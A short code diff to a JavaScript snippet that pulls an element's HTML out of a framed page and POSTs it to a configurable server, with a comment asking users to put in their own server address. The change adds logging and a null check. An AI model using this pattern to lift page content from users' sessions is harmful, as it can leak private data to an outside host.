@@ -25,7 +25,8 @@
 
   setTimeout(() => {
     let extractData = document.getElementById("test").contentWindow.document.getElementById(extract)
-
+    console.log('found : ')
+    console.log(extractData)
 // REPLACE SERVER ADRESS TO SEND TO YOUR SERVER NOT MINE
     fetch(url, {
       method: 'POST',
@@ -33,7 +34,7 @@
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
-        html: extractData.outerHTML
+        html: extractData?.outerHTML
       })
     });
 
